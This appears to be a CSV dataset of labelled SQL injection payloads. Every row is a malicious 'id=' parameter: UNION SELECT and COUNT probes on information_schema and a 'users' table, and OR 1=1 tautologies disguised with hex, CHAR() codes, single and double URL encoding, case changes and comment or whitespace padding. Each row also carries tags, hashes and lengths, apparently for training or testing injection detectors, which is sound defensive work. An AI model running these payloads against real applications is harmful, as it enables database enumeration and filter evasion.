id%3D1%27+AND+%28SELECT+COUNT%28%2A%29+FROM+information_schema.columns+WHERE+table_name%3D%27users%27%29%3E0+--,1,sqli_info_schema,comment_dash_dash,url_encoded,SQLI_INFO_SCHEMA_003,0805969060c5d89cfa3f1d44abe312b6,aa61dcd6c11c98c7e430519bb5bd9640,111
id%253D1%2527%2509And%2509%2528SELECT%2509COUNT%2528%252A%2529%2509from%2509information_schema.columns%2509wHErE%2509table_name%253D%2527users%2527%2529%253E0%2509%252523,1,sqli_info_schema,case_var|comment_url_hash|ws_tab,double_encoded,SQLI_INFO_SCHEMA_003,b994515fe3670f38582ef1bca6e62d4f,e1fa43dd73e8e8d818e8680d17f5d20b,170
"id=1' UNION SELECT column_name, table_name FROM information_schema.columns WHERE table_name='users' /*",1,sqli_info_schema,comment_block_comment|ws_space,raw,SQLI_INFO_SCHEMA_002,bdfdea80b14ff5c79d296419d2f9af81,8301a0623dff30e604379c319813f1b8,102
id%253D1%2527%2BUnion%2Bselect%2Btable_name%252C%2Btable_schema%2BFROM%2Binformation_schema.tables%2B--%2B-,1,sqli_info_schema,case_var|comment_dash_dash_space,double_encoded,SQLI_INFO_SCHEMA_001,e56f87115289a27bffe874d31dd44a6c,0758e6f057ea97f27ea7f63fd3eb0763,107
id%3D1%27%2BUNION%2BSELECT%2Btable_name%2C%2Btable_schema%2BFROM%2Binformation_schema.tables%2B--,1,sqli_info_schema,comment_dash_dash|ws_mixed_ws,url_encoded,SQLI_INFO_SCHEMA_001,27f323923c7961e22d3727ab7a419976,7118ccaa18b7e6827114420360abeab7,97
"id=1'/**/UNION/**/select/**/column_name,/**/table_name/**/from/**/information_schema.columns/**/WHere/**/table_name='users'/**/;--/**/-",1,sqli_info_schema,case_var|comment_semicolon_comment|ws_comment_ws,raw,SQLI_INFO_SCHEMA_002,397834e9d8807a560eada69c31f95df1,48fd9947aa6bc746c696c6c56fe65562,135
id%253D1%2527%2BUNION%2BSELECT%2Btable_name%252C%2Btable_schema%2BFROM%2Binformation_schema.tables%2B%2523,1,sqli_info_schema,comment_hash,double_encoded,SQLI_INFO_SCHEMA_001,fcfcd7f3b1ac73d68b65a26d8ebf650d,95ac3739696624923e0ed1845cf65a9c,106
id%3D1%27+UNION+SELECT+table_name%2C+table_schema+FROM+information_schema.tables+%3B--+-,1,sqli_info_schema,case_var|comment_semicolon_comment,url_encoded,SQLI_INFO_SCHEMA_001,5f9d6d852862519fe59c3990497c5f8b,843a7997e14c1e4c830ec0951f8fd49d,88
id%253D1%2527%2B%2B%2BUNION%2B%2B%2BSELECT%2B%2B%2Btable_name%252C%2B%2B%2Btable_schema%2B%2B%2BFROM%2B%2B%2Binformation_schema.tables%2B%2B%2B--%2B%2B%2B-,1,sqli_info_schema,comment_dash_dash_space|ws_mixed_ws,double_encoded,SQLI_INFO_SCHEMA_001,39bbbfbb4b3a2b4b60ac49cf2a54c31e,f288316e570ea4d841410e3d53001104,155
id%3D1%27%09UNION%09SELECT%09column_name%2C%09table_name%09FROM%09information_schema.columns%09WHERE%09table_name%3D%27users%27%09--,1,sqli_info_schema,comment_dash_dash|ws_tab,url_encoded,SQLI_INFO_SCHEMA_002,7bd04d00a48a125e0cd6fb7a473471cb,4c322f4a28a58432a3e6ca6a98661f21,132
"id=1'+UNION+SELECT+column_name, table_name+FROM information_schema.columns+WHERE+table_name='users%27 ;--+-",1,sqli_info_schema,comment_semicolon_comment,partially_encoded,SQLI_INFO_SCHEMA_002,c20b2215d0f2dea480f943a81deea13e,3feb1b765e6e8e8c3cf0dd6289b41c16,107
id%3D1%27%2520UNION%2520SELECT%2520column_name%2C%2520table_name%2520FROM%2520information_schema.columns%2520WHERE%2520table_name%3D%27users%27%2520%2F%2A,1,sqli_info_schema,comment_block_comment|ws_url_space,url_encoded,SQLI_INFO_SCHEMA_002,592ca76b80cf47eed31cc04b3af60d6b,baea145e8839bc167ddf2066398eaf3d,154
id%3D1%27+Union+selEct+column_name%2C+table_name+FROM+information_schema.columns+WHere+table_name%3D%27users%27+%3B--+-,1,sqli_info_schema,case_var|comment_semicolon_comment,url_encoded,SQLI_INFO_SCHEMA_002,0582773d7e1ea4f1b828a6b57ecd0c86,692abb465fe53e2fcd3bce9c80687252,119
id%253D1%2527%252BUNION%252BSeleCt%252Btable_name%252C%252Btable_schema%252BFROM%252Binformation_schema.tables%252B--%252B-,1,sqli_info_schema,case_var|comment_dash_dash_space|ws_mixed_ws,double_encoded,SQLI_INFO_SCHEMA_001,13b45c1639ecc3e501869c950bc55d18,881b0cdeaf85c5c18f608da7a0cf1666,123
"id%3D1' Union seleCT table_name, table_schema+FROm+information_schema.tables+%3B--+-",1,sqli_info_schema,case_var|comment_semicolon_comment,partially_encoded,SQLI_INFO_SCHEMA_001,58bbbefc803029361384046a005caa79,cfb9bd7f12d2ba9d8e2c96ba0bdd8309,84
"id=1%27%20unIon%20SEleCT%20table_name,%20table_schema%20FROM%20information_schema.tables%20#",1,sqli_info_schema,case_var|comment_hash|ws_url_space,partially_encoded,SQLI_INFO_SCHEMA_001,4210e00d8e15382a5f29ab17dde12bc1,e69654e0777e022485edd95abf38a2c1,92
id%3D1%27 aNd+(SELECT+COUNT(*)+from+information_schema.columns+wHeRe table_name%3D'users%27)>0 %2F%2A,1,sqli_info_schema,case_var|comment_block_comment,partially_encoded,SQLI_INFO_SCHEMA_003,9728a51e99806ce5a51f41bcffa43bb8,92d891ab5fcff54986775ab9edb75495,101
id%253D1%2527%2509Union%2509SELECT%2509table_name%252C%2509table_schema%2509from%2509information_schema.tables%2509--,1,sqli_info_schema,case_var|comment_dash_dash|ws_tab,double_encoded,SQLI_INFO_SCHEMA_001,ce4aa12f30d90b0419cbdb2c4f078e9c,0c3901f60c2ffa71ad169c922b16de7c,117
id=1' AND+(SELECT+COUNT(%2A) FROM+information_schema.columns WHERE table_name%3D'users')%3E0 /*,1,sqli_info_schema,comment_block_comment,partially_encoded,SQLI_INFO_SCHEMA_003,61003b9cff9dd8c5ca1f04f82390bfff,0e6eadae58de8c35c0caf406e354612f,95
id%253D1%2527%2BAND%2B%2528SELECT%2BCOUNT%2528%252A%2529%2BFROM%2Binformation_schema.columns%2BWHERE%2Btable_name%253D%2527users%2527%2529%253E0%2B--%2B-,1,sqli_info_schema,comment_dash_dash_space,double_encoded,SQLI_INFO_SCHEMA_003,ed4938a0e4e51b18e0edfe6417229cff,5fbaa665b83dff08fe11e4c0f2a66910,153
id%253D1%2527%2BUNION%2BSELECT%2Bcolumn_name%252C%2Btable_name%2BFROM%2Binformation_schema.columns%2BWHERE%2Btable_name%253D%2527users%2527%2B--,1,sqli_info_schema,comment_dash_dash|ws_space,double_encoded,SQLI_INFO_SCHEMA_002,235b1e34693077a6af66062950548ba0,4f499d82ed04682444ec3ed865376deb,144
id=1'%20And%20(SELECT%20COUNT(*)%20FROM%20information_schema.columns%20Where%20table_name='users')>0%20--,1,sqli_info_schema,case_var|comment_dash_dash|ws_url_space,raw,SQLI_INFO_SCHEMA_003,f8fae22f1f64a22e8b4a4942e377a71a,98e46a20bd1c6a2e2270e43176983a97,105
id%3D1%27++AND++%28SELECT++COUNT%28%2A%29++FROM++information_schema.columns++WHERE++table_name%3D%27users%27%29%3E0++--++-,1,sqli_info_schema,comment_dash_dash_space|ws_multi_space,url_encoded,SQLI_INFO_SCHEMA_003,0c97b5db8cf0086147b0710a569af98c,63507c2853e730fd2baf696d2a50b168,122
"id%3D1%27+union+Select column_name,+table_name+FROM information_schema.columns+Where+table_name%3D'users' %23",1,sqli_info_schema,case_var|comment_url_hash,partially_encoded,SQLI_INFO_SCHEMA_002,4e68d2c792c5badcf70f981740d699f8,b3fbf42e7236fbab4a57a83b906e14b0,109
"id=1' union select table_name, table_schema From information_schema.tables #",1,sqli_info_schema,case_var|comment_hash,raw,SQLI_INFO_SCHEMA_001,85abf0ce14035c1b41981bf22eacfa97,9b6a0754c86a6be242c16842714b0e70,76
id%253D1%2527%2BUnion%2BSelect%2Btable_name%252C%2Btable_schema%2Bfrom%2Binformation_schema.tables%2B%253B--%2B-,1,sqli_info_schema,case_var|comment_semicolon_comment|ws_space,double_encoded,SQLI_INFO_SCHEMA_001,c15746d2279a55957fb81c69b30a96c4,6796aa78f37db01c5d93268e3261fbf9,112
id%3D1%27+Union+select+table_name%2C+table_schema+froM+information_schema.tables+--,1,sqli_info_schema,case_var|comment_dash_dash,url_encoded,SQLI_INFO_SCHEMA_001,569a79a8e5e02e438dd9e1f17d6a07af,3fadefe8721f14cf8a0e8940bcdc4b1c,83
id%3D1%27%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2Fcolumn_name%2C%2F%2A%2A%2Ftable_name%2F%2A%2A%2FFROM%2F%2A%2A%2Finformation_schema.columns%2F%2A%2A%2FWHERE%2F%2A%2A%2Ftable_name%3D%27users%27%2F%2A%2A%2F%2F%2A,1,sqli_info_schema,comment_block_comment|ws_comment_ws,url_encoded,SQLI_INFO_SCHEMA_002,9298e3a9b5f2bf03146bc88f4216b7e4,b03484530781bf05004ca99ad8f79f6c,217
id%253D1%2527%252520and%252520%2528SELECT%252520COUNT%2528%252A%2529%252520from%252520information_schema.columns%252520whERe%252520table_name%253D%2527users%2527%2529%253E0%252520%252F%252A,1,sqli_info_schema,case_var|comment_block_comment|ws_mixed_ws,double_encoded,SQLI_INFO_SCHEMA_003,f60eb80144eb428487afdd91aecbad6b,99e91c49d1b5ffe0e28edff04e122936,189
"id%3D1%27 UNION+SELECT column_name,+table_name FROM information_schema.columns WHERE table_name%3D'users%27 #",1,sqli_info_schema,comment_hash,partially_encoded,SQLI_INFO_SCHEMA_002,914a61db15fce46dfef2fe68b8e7dc85,e4aaf3db2035c9f05a40a7eda87797d5,109
"id=1'+Union+SELECT+table_name,+table_schema+FRoM+information_schema.tables+/*",1,sqli_info_schema,case_var|comment_block_comment|ws_plus,raw,SQLI_INFO_SCHEMA_001,ce03e3f5b0c71b4dba00cec6576f3ce4,bda577ac78e5a45a42e381fdda5d7d9b,77
id%3D1%27%09union%09select%09column_name%2C%09table_name%09FROM%09information_schema.columns%09where%09table_name%3D%27users%27%09%3B--%09-,1,sqli_info_schema,case_var|comment_semicolon_comment|ws_tab,url_encoded,SQLI_INFO_SCHEMA_002,35f8721f6d72485c1b5c7b873c57c58f,a6d5b718826ce7561b94bb53039ef802,139
id=1%27 AND+(SELECT+COUNT(*) FROM+information_schema.columns+WHERE+table_name%3D'users%27)%3E0+%3B--+-,1,sqli_info_schema,comment_semicolon_comment,partially_encoded,SQLI_INFO_SCHEMA_003,b6a429f72e02458fdc9b901a75d82a77,ebfbf6f34f0358a24dace6146561fe69,102
id%3D1%27%2BAND%2B%28SELECT%2BCOUNT%28%2A%29%2BFROM%2Binformation_schema.columns%2BWHERE%2Btable_name%3D%27users%27%29%3E0%2B%23,1,sqli_info_schema,comment_hash|ws_plus,url_encoded,SQLI_INFO_SCHEMA_003,5a98c01b13415a3d472d7a81ab361dfd,3877fc039967df13cbd9deeebd1f5a76,128
"id=1%27+UnION select+column_name,+table_name+FROM information_schema.columns where+table_name=%27users'+--",1,sqli_info_schema,case_var|comment_dash_dash,partially_encoded,SQLI_INFO_SCHEMA_002,b951c931ab12467cf8bcee7d3865eff9,e207522adcbcdc90197423ccba390de3,106
"id=1%27+UNION+SELECT table_name,+table_schema FROM information_schema.tables+;-- -",1,sqli_info_schema,comment_semicolon_comment,partially_encoded,SQLI_INFO_SCHEMA_001,e7a7bbbe4fcf927ce281cdacd1348550,d82d09b413529f7cbdd8c41f1951ba9e,82
id%253D1%2527%252F%252A%252A%252FUNION%252F%252A%252A%252FSELECT%252F%252A%252A%252Fcolumn_name%252C%252F%252A%252A%252Ftable_name%252F%252A%252A%252FFROM%252F%252A%252A%252Finformation_schema.columns%252F%252A%252A%252FWHERE%252F%252A%252A%252Ftable_name%253D%2527users%2527%252F%252A%252A%252F%252523,1,sqli_info_schema,comment_url_hash|ws_comment_ws,double_encoded,SQLI_INFO_SCHEMA_002,86d2ac4f00f0217b8c6c03d7230e2c46,90ec9af561aabfdd8231c579ffabb632,302
id%3D1%27+UNION+SeLeCT+table_name%2C+table_schema+from+information_schema.tables+--+-,1,sqli_info_schema,case_var|comment_dash_dash_space|ws_space,url_encoded,SQLI_INFO_SCHEMA_001,382d9722d40ce3f48d0e527ccac0baf7,af05fabf247e31201487e126a44edc23,85
"id%3D1'+union+SeLect+column_name,+table_name+From+information_schema.columns+Where+table_name=%27users'+%23",1,sqli_info_schema,case_var|comment_url_hash|ws_plus,partially_encoded,SQLI_INFO_SCHEMA_002,daf6e0aa8ab8e0ca4d3dcab0d284336d,e06aa176e93b0ca2c6f87422c6816593,107
id%253D1%2527%2BUNION%2BSELECT%2Bcolumn_name%252C%2Btable_name%2BFROM%2Binformation_schema.columns%2BWHERE%2Btable_name%253D%2527users%2527%2B--%2B-,1,sqli_info_schema,comment_dash_dash_space|ws_space,double_encoded,SQLI_INFO_SCHEMA_002,1bd1a92bd1121852b256d8a805980bee,6122104f144758ca4e6dc52c28b3f08c,148
id=1' AND (SELECT+COUNT(%2A) FROM+information_schema.columns+WHERE+table_name=%27users%27)>0+%23,1,sqli_info_schema,comment_hash,partially_encoded,SQLI_INFO_SCHEMA_003,ef6ff5954687e24a5fdf5a7f35a044e5,7bc835a5c39ed5d99fb87baf23fde5f1,96
id%3D%27%20%4f%52%20%31%3d%31%3B-- -,1,sqli_encoded,case_var|comment_semicolon_comment,partially_encoded,SQLI_ENCODED_003,4fe174547e24b988cb0718673300dd72,8a964c9beff7e4d47743219e677460d5,36
id%253DCHAR%252839%252C%2B32%252C%2B79%252C%2B82%252C%2B32%252C%2B49%252C%2B61%252C%2B49%2529,1,sqli_encoded,ws_space,double_encoded,SQLI_ENCODED_002,05514480055428a31675b857aa3825eb,7e54175e27f5e902be8cce142e285c0e,93
id=%27%20%4f%52%20%31%3d%31#,1,sqli_encoded,comment_hash|ws_space,partially_encoded,SQLI_ENCODED_003,8641a639a959e9e52af1d8fe9a272d61,8641a639a959e9e52af1d8fe9a272d61,28
id%3D%2527%2520%254f%2552%2520%2531%253d%2531,1,sqli_encoded,ws_tab,url_encoded,SQLI_ENCODED_003,d55b34906474e158ab0d86880cd32207,1307985b4a06767fe3a9c77a35a0e570,45
id=%27%20%4f%52%20%31%3d%31--,1,sqli_encoded,comment_dash_dash|ws_plus,raw,SQLI_ENCODED_003,5a186fa8d07d5cb331abdb7feb8f05fa,5a186fa8d07d5cb331abdb7feb8f05fa,29
id%3D0x27204f5220313d31%23,1,sqli_encoded,case_var|comment_url_hash,partially_encoded,SQLI_ENCODED_001,d8fe215202a02c48adadaf48c259bcd7,9695607bf4a902f208aef6733411fb8b,26
id=%27%20%4f%52%20%31%3d%31,1,sqli_encoded,standard,raw,SQLI_ENCODED_003,aa6c30cf63a25a06c7ae6ef627669b94,aa6c30cf63a25a06c7ae6ef627669b94,27
id=%2527%2520OR%25201%253d1,1,sqli_encoded,case_var|ws_mixed_ws,raw,SQLI_ENCODED_004,5c0f18419cabe2a0a033583c00effd7f,a9086d97aec5a32dbccbd210bbd7ddca,27
id%3D%252527%252520OR%2525201%25253d1%3B--%09-,1,sqli_encoded,case_var|comment_semicolon_comment|ws_tab,url_encoded,SQLI_ENCODED_004,0562c2a62aeea58fb6555f2f1f9acd01,6156c03ef639dd9f8f864374ce8d3ff1,46
"id%3DCHAR(39,+32,+79,+82,+32,+49,+61, 49)%23",1,sqli_encoded,case_var|comment_url_hash,partially_encoded,SQLI_ENCODED_002,3c524d79734eead79f2641789b0ab43f,c0e15ae91193251b4374624c90c0954f,44
id=0x27204f5220313d31,1,sqli_encoded,standard,partially_encoded,SQLI_ENCODED_001,a29f85970dee6e77d5fa33be8d002463,a29f85970dee6e77d5fa33be8d002463,21
id=%2527%2520OR%25201%253d1;-- -,1,sqli_encoded,comment_semicolon_comment,raw,SQLI_ENCODED_004,ea8458dfe2c1b91734461c7b3d37b904,d489a063fe2937a08c4967093562be2b,32
id%3DCHAR%28115%2C101%2C108%2C101%2C99%2C116%29,1,sqli_encoded,ws_mixed_ws,url_encoded,SQLI_ENCODED_005,6587f318bd0ba385a92362e9c355f79c,a8c1d0c3650f622350af5a650cc2c7c4,47
id%3D%27%20%4f%52%20%31%3d%31--,1,sqli_encoded,case_var|comment_dash_dash|ws_comment_ws,partially_encoded,SQLI_ENCODED_003,419131459463eaf46e8a0e8de95552a6,aad15f6e89bdeadb2f5cf06636369819,31
"id=CHAR(39,+32,+79,+82, 32, 49,+61,+49)-- -",1,sqli_encoded,case_var|comment_dash_dash_space,partially_encoded,SQLI_ENCODED_002,e7fdf02b21d7fc5c4932bef5104675ff,6632cc56b9aaeb37992a4a79ad712486,43
id%3D%2527%2520OR%25201%253d1%3B--/**%2F-,1,sqli_encoded,comment_semicolon_comment|ws_mixed_ws,partially_encoded,SQLI_ENCODED_004,0c390e77a2eb393a4d1f0202efa889bb,75d4dbfa287a17d36ae3da2ce304a30e,41
id%253D%25252527%25252520OR%252525201%2525253d1%253B--%252B-,1,sqli_encoded,case_var|comment_semicolon_comment|ws_plus,double_encoded,SQLI_ENCODED_004,64d05558341a04fb4b00f2b68399e961,7d374dc2f15012ae09f134dc93f1028d,60
"id=CHAR(39,	32,	79,	82,	32,	49,	61,	49)",1,sqli_encoded,case_var|ws_tab,raw,SQLI_ENCODED_002,c01bd307152239b5d1260c36baa17ddd,331f543eed1849ddb8165ee78d3e3d40,39
id%3D%2527%2520%254f%2552%2520%2531%253d%2531%3B--+-,1,sqli_encoded,comment_semicolon_comment,url_encoded,SQLI_ENCODED_003,e2c69a83a55920b4f50e6f57880e2c32,5daf721682d991e7a45230224b7a43ec,52
id=0x27204f5220313d31/*,1,sqli_encoded,case_var|comment_block_comment|ws_url_space,raw,SQLI_ENCODED_001,cd93f395d5e4585554da562838d63a21,cd93f395d5e4585554da562838d63a21,23
id%253D0x27204f5220313d31--,1,sqli_encoded,comment_dash_dash,double_encoded,SQLI_ENCODED_001,e54039dde4a731d839f8a724f99e4456,aef33d6ff8b1c415f18ccfe2055c6d6a,27
id%253DCHAR%252839%252C%250932%252C%250979%252C%250982%252C%250932%252C%250949%252C%250961%252C%250949%2529%252523,1,sqli_encoded,case_var|comment_url_hash|ws_tab,double_encoded,SQLI_ENCODED_002,ace2b4ece5f613d5ad88517dff73793f,652e21b7c5807fc0d358a7274047e1cb,114
id%253D%252527%252520%25254f%252552%252520%252531%25253d%252531%2523,1,sqli_encoded,case_var|comment_hash,double_encoded,SQLI_ENCODED_003,8b623827f7d782ca206e61d489961aae,da7b5726953df17b9c237b75fe6de535,68
id%3DCHAR%2839%2C%2F%2A%2A%2F32%2C%2F%2A%2A%2F79%2C%2F%2A%2A%2F82%2C%2F%2A%2A%2F32%2C%2F%2A%2A%2F49%2C%2F%2A%2A%2F61%2C%2F%2A%2A%2F49%29,1,sqli_encoded,case_var|ws_comment_ws,url_encoded,SQLI_ENCODED_002,308674368a22594345b827ce8e961607,3e5cc05ce8f2e101c167d279ef2aa016,136
"id%3DCHAR(115,101,108,101,99,116)",1,sqli_encoded,ws_mixed_ws,partially_encoded,SQLI_ENCODED_005,58ce021ab8d1a2a8bce1c710e26b2c57,93b654ec6327634afd34f4d892d2223e,33
id=0x27204f5220313d31%3B--+-,1,sqli_encoded,comment_semicolon_comment|ws_plus,partially_encoded,SQLI_ENCODED_001,c6fcf483c5909c057a3e8027a4b0a2c2,da80b5376318a49c28be12b847eb55a7,28
"id=CHAR(39, 32, 79, 82, 32,+49,+61,+49)/*",1,sqli_encoded,case_var|comment_block_comment,partially_encoded,SQLI_ENCODED_002,44d3289031682d6aab0cbeab933c0bfd,8facf222b2b0c3ed4b443c112a6b0f59,41
id%3DCHAR%28115%2C101%2C108%2C101%2C99%2C116%29%3B--+-,1,sqli_encoded,case_var|comment_semicolon_comment,url_encoded,SQLI_ENCODED_005,c23c10c12a59ce351c279f43fa9af470,fd2874aa39d21b571361f70b8ef0ac4d,54
id=%2527%2520OR%25201%253d1/*,1,sqli_encoded,comment_block_comment|ws_space,raw,SQLI_ENCODED_004,376e183cfd5f054577cc586b5b413267,a04290d5c38f4fdc6fa935919937eb99,29
id%253DCHAR%2528115%252C101%252C108%252C101%252C99%252C116%2529%252F%252A,1,sqli_encoded,case_var|comment_block_comment,double_encoded,SQLI_ENCODED_005,7208fd061f254e61a5683a2600582153,9c636dbb211ee2d81951a2c7577ec216,73
id%253DCHAR%2528115%252C101%252C108%252C101%252C99%252C116%2529,1,sqli_encoded,ws_plus,double_encoded,SQLI_ENCODED_005,6f2e1c912e7137acd010b0be3d3a3724,0d4e1f93d126779982361919a0bbdc64,63
id=0x27204f5220313d31-- +-,1,sqli_encoded,case_var|comment_dash_dash_space|ws_multi_space,partially_encoded,SQLI_ENCODED_001,5c198d679d4011302b9d743c7870ad45,c157df612a1a53a9fdb66bb178884edf,26
id%3D0x27204f5220313d31--,1,sqli_encoded,case_var|comment_dash_dash|ws_url_space,url_encoded,SQLI_ENCODED_001,28b8f81860ebd73d998cf1f493039c05,02767ef58c24c595a8cd81c730aa443e,25
id%3D0x27204f5220313d31,1,sqli_encoded,case_var|ws_tab,url_encoded,SQLI_ENCODED_001,7e66561212dcdc7c0f6d979527780434,971dd68d60e638d5174f10461a7c6b00,23
id%253DCHAR%252839%252C%252B32%252C%252B79%252C%252B82%252C%252B32%252C%252B49%252C%252B61%252C%252B49%2529%2523,1,sqli_encoded,case_var|comment_hash|ws_plus,double_encoded,SQLI_ENCODED_002,4e3df43b02cefdba6f87303dd908c27c,603a7d80730452450100baeb4de5907e,112
id%3D%2527%2520OR%25201%253d1%3B--+ +-,1,sqli_encoded,case_var|comment_semicolon_comment|ws_mixed_ws,partially_encoded,SQLI_ENCODED_004,33d76529bdd33a45a5734bf47f4464e0,11499502703b95db5dfa87a563f9f8e8,38
id%3D%27%20%4f%52%20%31%3d%31,1,sqli_encoded,case_var,partially_encoded,SQLI_ENCODED_003,004373905f88b33da09ac7e7ea696c1c,17ee123f905311310c66d17b77cba585,29
id%3D%2527%2520%254f%2552%2520%2531%253d%2531%3B--%2F%2A%2A%2F-,1,sqli_encoded,comment_semicolon_comment|ws_comment_ws,url_encoded,SQLI_ENCODED_003,68b1ae75e82f0c909a1d0ac907b6f9e5,d34e3b373b8f8c34646de2e37a38688d,63
id%3D%2527%2520OR%25201%253d1,1,sqli_encoded,ws_mixed_ws,partially_encoded,SQLI_ENCODED_004,1bf40216b400cf4056a3e65cfcdef4de,d18048f880c31a4e4b4413e87bfa75b4,29
id%3DCHAR%2839%2C+32%2C+79%2C+82%2C+32%2C+49%2C+61%2C+49%29,1,sqli_encoded,case_var,url_encoded,SQLI_ENCODED_002,93b4ab3b7689d208cc1e773bb170c92d,ff097c6df87d4e56a8b3d0e5cf1267ef,59
id%253DCHAR%252839%252C%250932%252C%250979%252C%250982%252C%250932%252C%250949%252C%250961%252C%250949%2529,1,sqli_encoded,ws_tab,double_encoded,SQLI_ENCODED_002,91fd42700d756d04fcf8e38d76e84b77,fc6fa2ebf4029351e86a64dbf4ec5011,107
id%3D%252527%252520OR%2525201%25253d1--,1,sqli_encoded,case_var|comment_dash_dash|ws_multi_space,url_encoded,SQLI_ENCODED_004,62681485ca3552683c5d5368940ff3b2,fbdacaf35e0dae5c95c4ff0f6403654e,39
id%253D%25252527%25252520OR%252525201%2525253d1%253B--%2B-,1,sqli_encoded,case_var|comment_semicolon_comment,double_encoded,SQLI_ENCODED_004,4c2731fc7be11fa6d11647f558299fc3,9917428d235e8730b6aac51b2bf98d5c,58
id%3D%252527%252520OR%2525201%25253d1,1,sqli_encoded,standard,url_encoded,SQLI_ENCODED_004,d77a0d575243d44793800b9f07d19cf7,ea0981073811f7c6b4fa6214513c60bc,37
"id=CHAR(115,101,108,101,99,116)#",1,sqli_encoded,case_var|comment_hash|ws_space,raw,SQLI_ENCODED_005,3ecc8f32ab4b0ddcef8c9f7d238fb4fa,8a772a4d93077aa8ed9f34c9f2ddf508,32
"id=CHAR(115,101,108,101,99,116)",1,sqli_encoded,case_var|ws_mixed_ws,raw,SQLI_ENCODED_005,24358562ede2489313039fb8fdeaa263,ea170e419d0b0f69c0bcae1435b2577b,31
id%253D0x27204f5220313d31,1,sqli_encoded,case_var|ws_comment_ws,double_encoded,SQLI_ENCODED_001,ab6264c9f6455e397fb2c250667928f1,51b688e4ff95a2688deb648c9b55981e,25
id%253D%252527%252520%25254f%252552%252520%252531%25253d%252531,1,sqli_encoded,case_var|ws_mixed_ws,double_encoded,SQLI_ENCODED_003,af6d9fd4cb53799751cb280cf4a2775f,c69f172f0e471b72de00301fb155e780,63
id=%27%20%4f%52%20%31%3d%31%23,1,sqli_encoded,case_var|comment_url_hash|ws_comment_ws,raw,SQLI_ENCODED_003,778b79b65f03bb4f6d0113eeb2ad2e80,778b79b65f03bb4f6d0113eeb2ad2e80,30
id%253D%25252527%25252520OR%252525201%2525253d1,1,sqli_encoded,case_var|ws_url_space,double_encoded,SQLI_ENCODED_004,4093a74613b962308da581706840ea2e,f1a27988be5883e5cba4da3c95f139b8,47
id%3D0x27204f5220313d31%3B--++-,1,sqli_encoded,comment_semicolon_comment|ws_multi_space,url_encoded,SQLI_ENCODED_001,d4a7bde012810cf15dd81f3b9ccf2404,4bffd7315d86d42a8f5c1755cb201c4a,31
id%253DCHAR%252839%252C%252B32%252C%252B79%252C%252B82%252C%252B32%252C%252B49%252C%252B61%252C%252B49%2529,1,sqli_encoded,case_var|ws_plus,double_encoded,SQLI_ENCODED_002,1345bfec8b1c9702c307c73434367444,2b8736b221e1ac1c1db5634d68004749,107
id%3D%252527%252520OR%2525201%25253d1%2523,1,sqli_encoded,case_var|comment_url_hash|ws_url_space,url_encoded,SQLI_ENCODED_004,208807ef303c9def6e0a645cb24578b8,91c212ba1f52459284f010ccff19a33c,42
"id%3DCHAR(115,101,108,101,99,116)/%2A",1,sqli_encoded,comment_block_comment,partially_encoded,SQLI_ENCODED_005,cfef10172843052d49ef97a75946b9c2,158065715f66616f31392a47a5ab2350,37
"id=CHAR(115,101,108,101,99,116)%2F%2A",1,sqli_encoded,case_var|comment_block_comment|ws_tab,partially_encoded,SQLI_ENCODED_005,0f3bdf940e34a02a2b0d3c976c05895c,3dd4502f60ec1cf415050d82de57966e,37
id=0x27204f5220313d31--,1,sqli_encoded,case_var|comment_dash_dash,raw,SQLI_ENCODED_001,47b5dcc3a78dfb788443950577db8c8e,47b5dcc3a78dfb788443950577db8c8e,23
id=0x27204f5220313d31%23,1,sqli_encoded,case_var|comment_url_hash,raw,SQLI_ENCODED_001,78038dff144d9ae1f2a8d90aee99650b,78038dff144d9ae1f2a8d90aee99650b,24
"id%3DCHAR(39, 32,+79,+82, 32, 49, 61,+49)",1,sqli_encoded,case_var,partially_encoded,SQLI_ENCODED_002,f2cb48f9d429efed1094c646b514cf6b,91fb72412d14be862bf667a251d7f2f7,41
id%253DCHAR%252839%252C%25252032%252C%25252079%252C%25252082%252C%25252032%252C%25252049%252C%25252061%252C%25252049%2529%252523,1,sqli_encoded,comment_url_hash|ws_url_space,double_encoded,SQLI_ENCODED_002,ac51ab94e30c7c1d4a746f4a166b0f30,047e811881aa2dd16363ceff6ec55a9b,128
id%3DCHAR%2839%2C%252032%2C%252079%2C%252082%2C%252032%2C%252049%2C%252061%2C%252049%29--%2520-,1,sqli_encoded,case_var|comment_dash_dash_space|ws_mixed_ws,url_encoded,SQLI_ENCODED_002,f8e0202cd96c75fec13e23b3c8cda9d3,349ff343ff69a43b1679b6f2f1795456,95
"id=CHAR(115,101,108,101,99,116)/*",1,sqli_encoded,comment_block_comment|ws_url_space,raw,SQLI_ENCODED_005,32857aa3e20bac101a758a70bf8da3d6,014a2931ae287bf74fbf0d2c6d32aa52,33
id=0x27204f5220313d31#,1,sqli_encoded,case_var|comment_hash,partially_encoded,SQLI_ENCODED_001,7e2a0bcda14f621d429d188e7923ace8,7e2a0bcda14f621d429d188e7923ace8,22
"id=CHAR(115,101,108,101,99,116);-- -",1,sqli_encoded,comment_semicolon_comment|ws_space,raw,SQLI_ENCODED_005,280662c696a962463b64d66874b84463,e559f727b2359fbd2b4db5aac4c9ff36,36
id%3DCHAR%28115%2C101%2C108%2C101%2C99%2C116%29--,1,sqli_encoded,case_var|comment_dash_dash|ws_comment_ws,url_encoded,SQLI_ENCODED_005,3dd07cc57cc78c50c8380b27c980201e,2a85d7abdc19ec10a5dac782fbf5fce2,49
id%3D0x27204f5220313d31/*,1,sqli_encoded,case_var|comment_block_comment,partially_encoded,SQLI_ENCODED_001,f1e5798ba6e06bb2d13b7f11808e18fe,0b69f63420982e289508a3bfdf093955,25
id%253D%252527%252520%25254f%252552%252520%252531%25253d%252531--,1,sqli_encoded,case_var|comment_dash_dash|ws_comment_ws,double_encoded,SQLI_ENCODED_003,68a69e355c89b3ab78d18f935cb7a0f2,8fa6d1f1aad9c8573ceb5bab5f33e89b,65
id%253D%252527%252520%25254f%252552%252520%252531%25253d%252531%252F%252A,1,sqli_encoded,case_var|comment_block_comment|ws_multi_space,double_encoded,SQLI_ENCODED_003,267fdf3ef53ec6899d33d8e9078c55b3,b6de1d1044e90abefb56db1efc845a1e,73
id%3DCHAR%2839%2C%252032%2C%252079%2C%252082%2C%252032%2C%252049%2C%252061%2C%252049%29,1,sqli_encoded,ws_url_space,url_encoded,SQLI_ENCODED_002,bb8b3caf9f183eb3358eeea3e60a2753,3767e4746a29754290af2dbcb03bc846,87
